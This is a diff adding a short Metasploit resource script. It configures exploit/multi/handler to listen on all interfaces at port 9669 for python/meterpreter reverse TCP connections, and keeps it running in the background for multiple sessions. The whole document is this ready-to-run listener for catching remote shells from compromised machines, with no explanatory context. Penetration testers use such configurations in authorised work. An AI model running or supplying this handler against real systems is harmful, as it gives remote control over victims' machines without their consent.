@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 9669
+set ExitOnSession false
+exploit -j -z
